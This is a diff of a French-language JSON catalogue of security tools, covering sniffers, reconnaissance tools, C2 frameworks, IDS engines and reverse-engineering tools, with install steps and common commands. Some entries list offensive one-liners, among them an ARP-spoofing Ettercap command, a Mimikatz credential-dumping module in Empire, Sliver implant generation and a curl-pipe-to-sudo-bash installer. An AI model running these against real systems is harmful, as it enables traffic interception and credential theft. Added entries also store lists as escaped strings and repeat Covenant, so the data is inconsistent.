-    "alternatives": ["Sleuth Kit", "FTK Imager"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "GUI Interface"
+    ],
+    "alternatives": [
+      "Sleuth Kit",
+      "FTK Imager"
+    ]
   },
   {
     "nom": "Ettercap",
@@ -559,9 +1013,19 @@
     "installation": "apt install ettercap-graphical",
     "documentation": "https://www.ettercap-project.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["ettercap -G", "ettercap -T -M arp:remote /target// /gateway//"],
-    "alternatives": ["Bettercap", "Cain & Abel"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "ettercap -G",
+      "ettercap -T -M arp:remote /target// /gateway//"
+    ],
+    "alternatives": [
+      "Bettercap",
+      "Cain & Abel"
+    ]
   },
   {
     "nom": "Bettercap",
@@ -571,9 +1035,20 @@
     "installation": "apt install bettercap",
     "documentation": "https://www.bettercap.org/",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["bettercap", "net.probe on", "net.sniff on"],
-    "alternatives": ["Ettercap", "MITMf"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "bettercap",
+      "net.probe on",
+      "net.sniff on"
+    ],
+    "alternatives": [
+      "Ettercap",
+      "MITMf"
+    ]
   },
   {
     "nom": "Recon-ng",
@@ -583,9 +1058,20 @@
     "installation": "apt install recon-ng",
     "documentation": "https://github.com/lanmaster53/recon-ng",
     "prix": "Gratuit",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["recon-ng", "marketplace install all", "modules load recon/domains-hosts/google_site_web"],
-    "alternatives": ["The Harvester", "Maltego"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "recon-ng",
+      "marketplace install all",
+      "modules load recon/domains-hosts/google_site_web"
+    ],
+    "alternatives": [
+      "The Harvester",
+      "Maltego"
+    ]
   },
   {
     "nom": "Maltego",
@@ -595,28 +1081,272 @@
     "installation": "Download: https://www.maltego.com/download/",
     "documentation": "https://docs.maltego.com/",
     "prix": "Gratuit/Payant",
-    "plateforme": ["Linux", "Windows", "macOS"],
-    "commandes_courantes": ["GUI Interface"],
-    "alternatives": ["Shodan", "Recon-ng"]
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "GUI Interface"
+    ],
+    "alternatives": [
+      "Shodan",
+      "Recon-ng"
+    ]
   },
   {
-  "nom": "Exegol",
-  "description": "Environnement Docker tout-en-un pour le pentest. Préconfiguré avec 400+ outils offensifs, gestionnaire de conteneurs optimisés.",
-  "categorie": "Infrastructure",
-  "type": "Environnement",
-  "installation": "pip3 install exegol && exegol install",
-  "documentation": "https://exegol.readthedocs.io/",
-  "prix": "Gratuit",
-  "plateforme": ["Linux", "Windows", "macOS"],
-  "commandes_courantes": [
-    "exegol start <container_name>",
-    "exegol install",
-    "exegol info",
-    "exegol exec <container> <command>",
-    "exegol stop <container_name>",
-    "exegol remove <container_name>"
-  ],
-  "alternatives": ["Kali Linux", "ParrotOS", "BlackArch"]
-}
-
+    "nom": "Exegol",
+    "description": "Environnement Docker tout-en-un pour le pentest. Préconfiguré avec 400+ outils offensifs, gestionnaire de conteneurs optimisés.",
+    "categorie": "Infrastructure",
+    "type": "Environnement",
+    "installation": "pip3 install exegol && exegol install",
+    "documentation": "https://exegol.readthedocs.io/",
+    "prix": "Gratuit",
+    "plateforme": [
+      "Linux",
+      "Windows",
+      "macOS"
+    ],
+    "commandes_courantes": [
+      "exegol start <container_name>",
+      "exegol install",
+      "exegol info",
+      "exegol exec <container> <command>",
+      "exegol stop <container_name>",
+      "exegol remove <container_name>"
+    ],
+    "alternatives": [
+      "Kali Linux",
+      "ParrotOS",
+      "BlackArch"
+    ]
+  },
+  {
+    "nom": "Empire/Starkiller",
+    "description": "Framework PowerShell post-exploitation avec GUI",
+    "categorie": "Post-Exploitation",
+    "type": "Open Source",
+    "installation": "pip3 install powershell-empire",
+    "documentation": "https://github.com/BC-SECURITY/Empire",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"uselistener http\", \"usestager multi/launcher\", \"usemodule credentials/mimikatz/logonpasswords\", \"usemodule privesc/powerup/allchecks\"]",
+    "alternatives": "[\"Covenant\", \"Metasploit\", \"Cobalt Strike\"]"
+  },
+  {
+    "nom": "Covenant",
+    "description": "Framework C2 .NET avec interface web moderne",
+    "categorie": "Command & Control",
+    "type": "Open Source",
+    "installation": "Docker ou compilation depuis source .NET",
+    "documentation": "https://github.com/cobbr/Covenant",
+    "prix": "Gratuit",
+    "plateforme": "[\"Windows\", \"Linux\"]",
+    "commandes_courantes": "[\"Cr\\u00e9er un listener\", \"G\\u00e9n\\u00e9rer un launcher\", \"Ex\\u00e9cuter des tasks\", \"Pivoting entre grunts\"]",
+    "alternatives": "[\"Empire\", \"Sliver\", \"Cobalt Strike\"]"
+  },
+  {
+    "nom": "Sliver",
+    "description": "Framework C2 moderne écrit en Go par BishopFox",
+    "categorie": "Command & Control",
+    "type": "Open Source",
+    "installation": "curl https://sliver.sh/install | sudo bash",
+    "documentation": "https://github.com/BishopFox/sliver",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"generate --mtls target.com\", \"mtls\", \"use [session-id]\", \"ps\", \"screenshot\"]",
+    "alternatives": "[\"Cobalt Strike\", \"Covenant\", \"Merlin\"]"
+  },
+  {
+    "nom": "Havoc C2",
+    "description": "Framework C2 moderne et modulaire",
+    "categorie": "Command & Control",
+    "type": "Open Source",
+    "installation": "Compilation depuis source (C++/Qt)",
+    "documentation": "https://github.com/HavocFramework/Havoc",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\"]",
+    "commandes_courantes": "[\"Cr\\u00e9er un listener\", \"G\\u00e9n\\u00e9rer un demon agent\", \"Post-exploitation modules\", \"Lateral movement\"]",
+    "alternatives": "[\"Sliver\", \"Brute Ratel\", \"Cobalt Strike\"]"
+  },
+  {
+    "nom": "Acunetix",
+    "description": "Scanner de vulnérabilités d'applications web",
+    "categorie": "Web Application Security",
+    "type": "Commercial",
+    "installation": "Installation via package ou appliance",
+    "documentation": "https://www.acunetix.com/",
+    "prix": "Commercial (~$4500+/an)",
+    "plateforme": "[\"Windows\", \"Linux\"]",
+    "commandes_courantes": "[\"D\\u00e9finir une cible web\", \"Configurer le scan\", \"Lancer le crawling\", \"Analyser les vuln\\u00e9rabilit\\u00e9s\"]",
+    "alternatives": "[\"Burp Suite Pro\", \"OWASP ZAP\", \"Netsparker\"]"
+  },
+  {
+    "nom": "Snort",
+    "description": "Système de détection/prévention d'intrusions (IDS/IPS)",
+    "categorie": "Network Security",
+    "type": "Open Source",
+    "installation": "apt install snort",
+    "documentation": "https://www.snort.org/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\"]",
+    "commandes_courantes": "[\"snort -A console -q -c /etc/snort/snort.conf -i eth0\", \"Cr\\u00e9er des r\\u00e8gles personnalis\\u00e9es\", \"Analyser les alertes\", \"Mode IPS inline\"]",
+    "alternatives": "[\"Suricata\", \"Zeek\", \"OSSEC\"]"
+  },
+  {
+    "nom": "Suricata",
+    "description": "Moteur IDS/IPS/NSM multi-thread haute performance",
+    "categorie": "Network Security",
+    "type": "Open Source",
+    "installation": "apt install suricata",
+    "documentation": "https://suricata.io/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\"]",
+    "commandes_courantes": "[\"suricata -c /etc/suricata/suricata.yaml -i eth0\", \"Gestion des r\\u00e8gles\", \"Int\\u00e9gration avec ELK\", \"Eve JSON output\"]",
+    "alternatives": "[\"Snort\", \"Zeek\", \"Security Onion\"]"
+  },
+  {
+    "nom": "Zeek (Bro)",
+    "description": "Framework d'analyse de trafic réseau et NSM",
+    "categorie": "Network Security Monitoring",
+    "type": "Open Source",
+    "installation": "apt install zeek",
+    "documentation": "https://zeek.org/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"macOS\"]",
+    "commandes_courantes": "[\"zeek -i eth0\", \"Analyser des PCAP\", \"Scripts personnalis\\u00e9s\", \"G\\u00e9n\\u00e9ration de logs structur\\u00e9s\"]",
+    "alternatives": "[\"Suricata\", \"Snort\", \"Moloch\"]"
+  },
+  {
+    "nom": "Security Onion",
+    "description": "Distribution Linux pour NSM, IDS et hunt de menaces",
+    "categorie": "Network Security Monitoring",
+    "type": "Open Source",
+    "installation": "ISO bootable ou installation réseau",
+    "documentation": "https://securityonionsolutions.com/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\"]",
+    "commandes_courantes": "[\"Stack complet: Suricata + Zeek + Elastic\", \"Interface Kibana\", \"PCAP analysis\", \"Alert triage\"]",
+    "alternatives": "[\"SELKS\", \"RockNSM\", \"Custom ELK stack\"]"
+  },
+  {
+    "nom": "Cuckoo Sandbox",
+    "description": "Système d'analyse automatisée de malware",
+    "categorie": "Malware Analysis",
+    "type": "Open Source",
+    "installation": "pip install cuckoo ou Docker",
+    "documentation": "https://cuckoosandbox.org/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\"]",
+    "commandes_courantes": "[\"cuckoo submit malware.exe\", \"cuckoo web\", \"Analyse de comportement\", \"Network capture\"]",
+    "alternatives": "[\"ANY.RUN\", \"Joe Sandbox\", \"Hybrid Analysis\"]"
+  },
+  {
+    "nom": "IDA Pro",
+    "description": "Désassembleur et débogueur professionnel",
+    "categorie": "Reverse Engineering",
+    "type": "Commercial",
+    "installation": "Installation via license commerciale",
+    "documentation": "https://hex-rays.com/ida-pro/",
+    "prix": "Commercial ($589-$3840+)",
+    "plateforme": "[\"Windows\", \"Linux\", \"macOS\"]",
+    "commandes_courantes": "[\"D\\u00e9sassemblage multi-architecture\", \"Decompiler (Hex-Rays)\", \"Debugging\", \"Plugin development\"]",
+    "alternatives": "[\"Ghidra\", \"Binary Ninja\", \"radare2\"]"
+  },
+  {
+    "nom": "Binary Ninja",
+    "description": "Plateforme de reverse engineering moderne",
+    "categorie": "Reverse Engineering",
+    "type": "Commercial",
+    "installation": "License commerciale",
+    "documentation": "https://binary.ninja/",
+    "prix": "Commercial ($399 Personal)",
+    "plateforme": "[\"Windows\", \"Linux\", \"macOS\"]",
+    "commandes_courantes": "[\"Analysis et d\\u00e9sassemblage\", \"IL (Intermediate Language)\", \"Python API\", \"Plugin ecosystem\"]",
+    "alternatives": "[\"IDA Pro\", \"Ghidra\", \"Cutter\"]"
+  },
+  {
+    "nom": "Frida",
+    "description": "Framework de dynamic instrumentation",
+    "categorie": "Dynamic Analysis",
+    "type": "Open Source",
+    "installation": "pip install frida-tools",
+    "documentation": "https://frida.re/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\", \"iOS\", \"Android\"]",
+    "commandes_courantes": "[\"frida -U -f com.app.name -l script.js\", \"Hook functions\", \"Modifier behavior at runtime\", \"Dump memory\"]",
+    "alternatives": "[\"Xposed\", \"Cydia Substrate\", \"Pin\"]"
+  },
+  {
+    "nom": "Apktool",
+    "description": "Outil de reverse engineering d'applications Android",
+    "categorie": "Mobile Security",
+    "type": "Open Source",
+    "installation": "apt install apktool",
+    "documentation": "https://ibotpeaches.github.io/Apktool/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"apktool d app.apk\", \"Modifier smali/resources\", \"apktool b app/\", \"Re-sign APK\"]",
+    "alternatives": "[\"jadx\", \"dex2jar\", \"Bytecode Viewer\"]"
+  },
+  {
+    "nom": "MobSF",
+    "description": "Framework automatisé d'analyse de sécurité mobile",
+    "categorie": "Mobile Security",
+    "type": "Open Source",
+    "installation": "Docker ou pip install",
+    "documentation": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"Interface web automatis\\u00e9e\", \"Static analysis Android/iOS\", \"Dynamic analysis\", \"Scan de vuln\\u00e9rabilit\\u00e9s\"]",
+    "alternatives": "[\"Drozer\", \"qark\", \"Objection\"]"
+  },
+  {
+    "nom": "Burp Suite Professional",
+    "description": "Suite complète de test d'applications web (version Pro)",
+    "categorie": "Web Application Security",
+    "type": "Commercial",
+    "installation": "JAR avec license",
+    "documentation": "https://portswigger.net/burp/pro",
+    "prix": "Commercial ($449/an)",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"Scanner automatis\\u00e9\", \"Intruder avec payloads\", \"Extensions BApp Store\", \"Collaboration\"]",
+    "alternatives": "[\"OWASP ZAP\", \"Acunetix\", \"AppSpider\"]"
+  },
+  {
+    "nom": "Postman",
+    "description": "Plateforme de test et développement d'API",
+    "categorie": "API Testing",
+    "type": "Freemium",
+    "installation": "Package natif ou snap",
+    "documentation": "https://www.postman.com/",
+    "prix": "Gratuit / Pro ($12/user/mois)",
+    "plateforme": "[\"Linux\", \"Windows\", \"macOS\"]",
+    "commandes_courantes": "[\"Cr\\u00e9er des requ\\u00eates\", \"Collections\", \"Tests automatis\\u00e9s\", \"Mock servers\"]",
+    "alternatives": "[\"Insomnia\", \"curl\", \"HTTPie\"]"
+  },
+  {
+    "nom": "Parrot OS",
+    "description": "Distribution Linux pour sécurité et vie privée",
+    "categorie": "Operating System",
+    "type": "Open Source",
+    "installation": "ISO bootable, VM",
+    "documentation": "https://www.parrotsec.org/",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"ARM\"]",
+    "commandes_courantes": "[\"Outils de pentest\", \"Focus sur la privacy\", \"AnonSurf pour anonymat\", \"Forensics tools\"]",
+    "alternatives": "[\"Kali Linux\", \"BlackArch\", \"BackBox\"]"
+  },
+  {
+    "nom": "Covenant Framework",
+    "description": "Alternative .NET à Cobalt Strike",
+    "categorie": "Command & Control",
+    "type": "Open Source",
+    "installation": "Docker ou build depuis source",
+    "documentation": "https://github.com/cobbr/Covenant",
+    "prix": "Gratuit",
+    "plateforme": "[\"Linux\", \"Windows\"]",
+    "commandes_courantes": "[\"Interface web moderne\", \"Grunts (agents) C#\", \"Post-exploitation tasks\", \"Credential harvesting\"]",
+    "alternatives": "[\"Cobalt Strike\", \"Empire\", \"Sliver\"]"
+  }
 ]
